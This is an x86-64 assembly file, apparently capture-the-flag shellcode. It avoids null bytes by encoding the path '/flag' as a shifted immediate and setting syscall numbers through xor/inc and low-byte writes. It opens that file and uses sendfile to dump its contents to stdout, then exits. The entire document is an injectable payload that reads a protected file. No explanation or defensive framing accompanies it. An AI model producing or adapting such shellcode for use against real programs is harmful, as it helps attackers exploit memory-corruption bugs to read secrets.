        .intel_syntax noprefix
        .global _start
        .text

_start:
open:
	// open 
//	mov rax,2
	xor rax, rax
	inc rax
	inc rax
	//const char __user * filename
	mov rdx, 0x67616c662faaaaaa
	shr	rdx, 24
	push 	rdx
	mov rdi, rsp
	// int flags
	xor rsi, rsi
	// umode_t mode
	xor rdx, rdx
	syscall
	push rax

sendfile:
        // size_t count
	mov 	r10, 123456789
	// loff_t__user * offset
	xor 	rdx, rdx
	// int in_fd
	pop 	rsi
	// int out_fd
	xor 	rdi, rdi
	inc rdi

	mov	al, 40
        syscall

exit:	//exit
	mov 	al, 60
	xor	rdi, rdi
	syscall
in: .ascii "/flag"
